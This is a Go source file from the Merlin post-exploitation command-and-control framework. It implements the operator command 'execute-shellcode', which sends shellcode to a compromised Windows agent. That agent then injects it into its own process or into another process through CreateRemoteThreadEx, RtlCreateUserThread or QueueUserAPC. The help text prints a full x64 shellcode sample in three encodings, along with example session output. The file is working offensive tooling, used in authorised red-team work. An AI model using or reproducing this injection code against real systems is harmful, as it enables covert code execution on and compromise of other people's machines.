/*
Merlin is a post-exploitation command and control framework.

This file is part of Merlin.
Copyright (C) 2024 Russel Van Tuyl

Merlin is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Merlin is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Merlin.  If not, see <http://www.gnu.org/licenses/>.
*/

package execute_shellcode

import (
	// Standard
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log/slog"
	os2 "os"
	"strconv"
	"strings"

	// 3rd Party
	"github.com/chzyer/readline"
	"github.com/google/uuid"

	// Internal
	"github.com/Ne0nd0g/merlin-cli/commands"
	"github.com/Ne0nd0g/merlin-cli/entity/help"
	"github.com/Ne0nd0g/merlin-cli/entity/menu"
	"github.com/Ne0nd0g/merlin-cli/entity/os"
	"github.com/Ne0nd0g/merlin-cli/message"
	"github.com/Ne0nd0g/merlin-cli/services/rpc"
)

// Command is an aggregate structure for a command executed on the command line interface
type Command struct {
	name   string      // name is the name of the command
	help   help.Help   // help is the Help structure for the command
	menus  []menu.Menu // menu is the Menu the command can be used in
	native bool        // native is true if the command is executed by an Agent using only Golang native code
	os     os.OS       // os is the supported operating system the Agent command can be executed on
}

// NewCommand is a factory that builds and returns a Command structure that implements the Command interface
func NewCommand() *Command {
	var cmd Command
	cmd.name = "execute-shellcode"
	cmd.menus = []menu.Menu{menu.AGENT}
	cmd.os = os.WINDOWS
	description := "Execute Windows shellcode"
	// Style guide for usage https://developers.google.com/style/code-syntax
	usage := "execute-shellcode {self|remote|RtlCreateUserThread|UserAPC} [PID] {shellcode | shellcodeFilePath}"
	example := ""
	notes := "Shellcode can be provided using an absolute filepath or by pasting it directly into the terminal in one of the following formats:\n\n" +
		"\t        Hex (e.g.,. 5051525356)\n" +
		"\t        0x50, 0x51, 0x52, 0x53, 0x56 with or without spaces and commas\n" +
		"\t        \\x50\\x51\\x52\\x53\\x56\n" +
		"\t        Base64 encoded version of the above formats\n" +
		"\t        A file containing any of the above formats or just a raw byte file\n\n" +
		"\tWarning: Shellcode injection and execution could cause a process to crash so choose wisely\n\n" +
		"\tNote: If Cobalt Strike’s Beacon is injected using one of these methods, exiting the Beacon will cause the process to die too."
	cmd.help = help.NewHelp(description, example, notes, usage)
	return &cmd
}

// Completer returns the data that is displayed in the CLI for tab completion depending on the menu the command is for
// Errors are not returned to ensure the CLI is not interrupted.
// Errors are logged and can be viewed by enabling debug output in the CLI
func (c *Command) Completer(menu.Menu, uuid.UUID) readline.PrefixCompleterInterface {
	return readline.PcItem(c.name,
		readline.PcItem("self"),
		readline.PcItem("remote"),
		readline.PcItem("RtlCreateUserThread"),
		readline.PcItem("userapc"),
	)
}

// Do executes the command and returns a Response to the caller to facilitate changes in the CLI service
// m, an optional parameter, is the Menu the command was executed from
// id, an optional parameter, used to identify a specific Agent or Listener
// arguments, and optional, parameter, is the full unparsed string entered on the command line to include the
// command itself passed into command for processing
func (c *Command) Do(m menu.Menu, id uuid.UUID, arguments string) (response commands.Response) {
	slog.Debug("entering into function", "menu", m, "id", id, "arguments", arguments)
	// Parse the arguments
	args := strings.Split(arguments, " ")

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 2 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command requires at least one argument\n%s", c, c.help.Usage()))
		return
	}

	switch strings.ToLower(args[1]) {
	case "self":
		return c.self(id, arguments)
	case "remote":
		return c.remote(id, arguments)
	case "rtlcreateuserthread":
		return c.rtlCreateUserThread(id, arguments)
	case "userapc":
		return c.userAPC(id, arguments)
	case "help", "-h", "--help", "?", "/?":
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, c.help.Description(), c.help.Usage(), c.help.Example(), c.help.Notes()))
		return
	default:
		response.Message = message.NewUserMessage(message.Info, c.help.Usage())
		return
	}
}

// self executes shellcode in the current Merlin Agent process
func (c *Command) self(id uuid.UUID, arguments string) (response commands.Response) {
	description := "Allocates space within the Merlin Agent process and executes the shellcode"
	example := "Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode self " +
		"505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F20" +
		"4801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3\n" +
		"\t[-]Created job joQNJONrEK for agent c1090dbc-f2f7-4d90-a241-86e0c0217786\n" +
		"\tMerlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job joQNJONrEK\n" +
		"\t[+]Shellcode executed successfully"
	notes := ""
	usage := "execute-shellcode self SHELLCODE"
	h := help.NewHelp(description, example, notes, usage)

	// Parse the arguments
	args := strings.Split(arguments, " ")

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 3 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s self' command requires at least two arguments\n%s", c, h.Usage()))
		return
	}

	// Check for help first
	if len(args) > 1 {
		switch strings.ToLower(args[1]) {
		case "help", "-h", "--help", "?", "/?":
			response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s self' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, h.Description(), h.Usage(), h.Example(), h.Notes()))
			return
		}
	}

	shellcode, err := parse(args[2])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error parsing the provided shellcode: %s", err))
		return
	}

	// 0. Shellcode as base64 string
	// 1. Method
	response.Message = rpc.ExecuteShellcode(id, []string{shellcode, args[1]})
	return
}

// remote executes shellcode in another process using the CreateRemoteThreadEx Windows API call
func (c *Command) remote(id uuid.UUID, arguments string) (response commands.Response) {
	description := "Creates a thread in another process using the CreateRemoteThreadEx Windows API call."
	example := "Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode remote 6560 " +
		"0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, " +
		"0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, " +
		"0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, " +
		"0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, " +
		"0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, " +
		"0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, " +
		"0x59, 0x58, 0xC3\n" +
		"\t[-]Created job PRumZQYBFR for agent c1090dbc-f2f7-4d90-a241-86e0c0217786\n" +
		"\tMerlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job PRumZQYBFR\n" +
		"\t[+]Shellcode executed successfully"
	notes := ""
	usage := "execute-shellcode remote PID SHELLCODE"
	h := help.NewHelp(description, example, notes, usage)

	// Parse the arguments
	args := strings.Split(arguments, " ")

	// Check for help first
	if len(args) > 2 {
		switch strings.ToLower(args[2]) {
		case "help", "-h", "--help", "?", "/?":
			response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s remote' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, h.Description(), h.Usage(), h.Example(), h.Notes()))
			return
		}
	}

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 4 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s remote' command requires at least two argument\n%s", c, c.help.Usage()))
		return
	}

	// Validate the PID is an integer
	_, err := strconv.Atoi(args[2])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error converting the PID to an integer: %s", err))
		return
	}

	shellcode, err := parse(args[3])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error parsing the provided shellcode: %s", err))
		return
	}

	// 0. Shellcode as base64 string
	// 1. Method
	// 2. PID
	response.Message = rpc.ExecuteShellcode(id, []string{shellcode, args[1], args[2]})
	return
}

// rtlCreateUserThread executes shellcode in another process using the undocumented RtlCreateUserThread Windows API call
func (c *Command) rtlCreateUserThread(id uuid.UUID, arguments string) (response commands.Response) {
	description := "Creates a thread in another process using the undocumented RtlCreateUserThread Windows API call."
	example := "Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode RtlCreateUserThread 6560 " +
		"\\x50\\x51\\x52\\x53\\x56\\x57\\x55\\x6A\\x60\\x5A\\x68\\x63\\x61\\x6C\\x63\\x54\\x59\\x48\\x83\\xEC\\x28" +
		"\\x65\\x48\\x8B\\x32\\x48\\x8B\\x76\\x18\\x48\\x8B\\x76\\x10\\x48\\xAD\\x48\\x8B\\x30\\x48\\x8B\\x7E\\x30" +
		"\\x03\\x57\\x3C\\x8B\\x5C\\x17\\x28\\x8B\\x74\\x1F\\x20\\x48\\x01\\xFE\\x8B\\x54\\x1F\\x24\\x0F\\xB7\\x2C" +
		"\\x17\\x8D\\x52\\x02\\xAD\\x81\\x3C\\x07\\x57\\x69\\x6E\\x45\\x75\\xEF\\x8B\\x74\\x1F\\x1C\\x48\\x01\\xFE" +
		"\\x8B\\x34\\xAE\\x48\\x01\\xF7\\x99\\xFF\\xD7\\x48\\x83\\xC4\\x30\\x5D\\x5F\\x5E\\x5B\\x5A\\x59\\x58\\xC3\n" +
		"\t[-]Created job CCWrmdLIFQ for agent c1090dbc-f2f7-4d90-a241-86e0c0217786\n" +
		"\tMerlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job CCWrmdLIFQ\n" +
		"\t[+]Shellcode executed successfully"
	notes := ""
	usage := "execute-shellcode rtlcreateuserthread PID SHELLCODE"
	h := help.NewHelp(description, example, notes, usage)

	// Parse the arguments
	args := strings.Split(arguments, " ")

	// Check for help first
	if len(args) > 2 {
		switch strings.ToLower(args[2]) {
		case "help", "-h", "--help", "?", "/?":
			response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s rtlcreateuserthread' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, h.Description(), h.Usage(), h.Example(), h.Notes()))
			return
		}
	}

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 4 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s rtlcreateuserthread' command requires at least two arguments\n%s", c, c.help.Usage()))
		return
	}

	// Validate the PID is an integer
	_, err := strconv.Atoi(args[2])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error converting the PID to an integer: %s", err))
		return
	}

	shellcode, err := parse(args[3])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error parsing the provided shellcode: %s", err))
		return
	}

	// 0. Shellcode as base64 string
	// 1. Method
	// 2. PID
	response.Message = rpc.ExecuteShellcode(id, []string{shellcode, args[1], args[2]})
	return
}

// userAPC executes shellcode in another process using the QueueUserAPC Windows API call
func (c *Command) userAPC(id uuid.UUID, arguments string) (response commands.Response) {
	description := "Creates a thread in another process using the QueueUserAPC Windows API call."
	example := "Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» execute-shellcode userapc 4824 /home/rickastley/calc.bin\n" +
		"\t[-]Created job NPQGRntaQX for agent c1090dbc-f2f7-4d90-a241-86e0c0217786\n" +
		"\tMerlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [+]Results for job NPQGRntaQX\n" +
		"\t[+]Shellcode executed successfully"
	notes := "This method is highly unstable and therefore was intentionally not added to the tab completion list of " +
		"available methods. The current implementation requires the process to have more than 1 thread. All " +
		"remaining threads will have a user-mode APC queued to execute the shellcode and could result in multiple " +
		"instances of execution. This method frequently causes processes to crash. Additionally, the shellcode " +
		"might not execute at all if none of the threads were in an alertable state. The svchost.exe process " +
		"usually provides a little better choice, but still not guaranteed."
	usage := "execute-shellcode userapc PID SHELLCODE"
	h := help.NewHelp(description, example, notes, usage)

	// Parse the arguments
	args := strings.Split(arguments, " ")

	// Check for help first
	if len(args) > 2 {
		switch strings.ToLower(args[2]) {
		case "help", "-h", "--help", "?", "/?":
			response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s' command help\n\nDescription:\n\t%s\nUsage:\n\t%s\nExample:\n\t%s\nNotes:\n\t%s", c, h.Description(), h.Usage(), h.Example(), h.Notes()))
			return
		}
	}

	// Validate at least one argument, in addition to the command, was provided
	if len(args) < 4 {
		response.Message = message.NewUserMessage(message.Info, fmt.Sprintf("'%s userapc' command requires at least two arguments\n%s", c, c.help.Usage()))
		return
	}

	// Validate the PID is an integer
	_, err := strconv.Atoi(args[2])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error converting the PID to an integer: %s", err))
		return
	}

	shellcode, err := parse(args[3])
	if err != nil {
		response.Message = message.NewErrorMessage(fmt.Errorf("there was an error parsing the provided shellcode: %s", err))
		return
	}

	// 0. Shellcode as base64 string
	// 1. Method
	// 2. PID
	response.Message = rpc.ExecuteShellcode(id, []string{shellcode, args[1], args[2]})
	return
}

// Help returns a help.Help structure that can be used to view a command's Description, Notes, Usage, and an example
func (c *Command) Help(menu.Menu) help.Help {
	return c.help
}

// Menu checks to see if the command is supported for the provided menu
func (c *Command) Menu(m menu.Menu) bool {
	for _, v := range c.menus {
		if v == m || v == menu.ALLMENUS {
			return true
		}
	}
	return false
}

// OS returns the supported operating system the Agent command can be executed on
func (c *Command) OS() os.OS {
	return c.os
}

// String returns the unique name of the command as a string
func (c *Command) String() string {
	return c.name
}

// parse determines if a file path was provided OR if shellcode in hex, byte, or base64 format was provided
func parse(input string) (string, error) {
	var data []byte

	// Check if shellcode argument is a file path
	f, err := os2.Stat(input)
	if err != nil {
		// If it is not a file path, see if it is data in base64 or hex format
		data, err = parseData([]string{input})
		if err != nil {
			return "", fmt.Errorf("there was an error parsing '%s' because is not a file path or hex data", input)
		}
	} else {
		if f.IsDir() {
			return "", fmt.Errorf("a directory was provided instead of a file: %s", input)
		}
		data, err = parseShellcodeFile(input)
		if err != nil {
			return "", fmt.Errorf("there was an error parsing the shellcode file: %s", err)
		}
	}
	return base64.StdEncoding.EncodeToString(data), nil
}

// parseData evaluates a string array to determine its format and returns a byte array of the hex
func parseData(str []string) ([]byte, error) {
	hexString := strings.Join(str, "")

	// see if it is Base64 encoded
	data, err := base64.StdEncoding.DecodeString(hexString)
	if err == nil {
		return data, err
	}

	// see if string is prefixed with 0x
	if hexString[0:2] == "0x" {
		hexString = strings.Replace(hexString, "0x", "", -1)
		hexString = strings.Replace(hexString, ",", "", -1)
		hexString = strings.Replace(hexString, " ", "", -1)
	}

	// see if string is prefixed with \x
	if hexString[0:2] == "\\x" {
		hexString = strings.Replace(hexString, "\\x", "", -1)
		hexString = strings.Replace(hexString, ",", "", -1)
		hexString = strings.Replace(hexString, " ", "", -1)
	}

	return hex.DecodeString(hexString)
}

// parseShellcodeFile parses a path, evaluates the file's contents, and returns a byte array of shellcode
func parseShellcodeFile(filePath string) ([]byte, error) {

	fileContents, err := os2.ReadFile(filePath) // #nosec G304 Users can include any file from anywhere
	if err != nil {
		return nil, err
	}

	hexBytes, errHex := parseData([]string{string(fileContents)})

	// If there was an error parsing the bytes, then it probably wasn't ASCII hex, therefore, continue on
	if errHex == nil {
		return hexBytes, nil
	}

	// See if it is Base64 encoded binary blob
	base64Data, errB64 := base64.StdEncoding.DecodeString(string(fileContents))
	if errB64 == nil {
		return base64Data, nil
	}

	return fileContents, nil
}
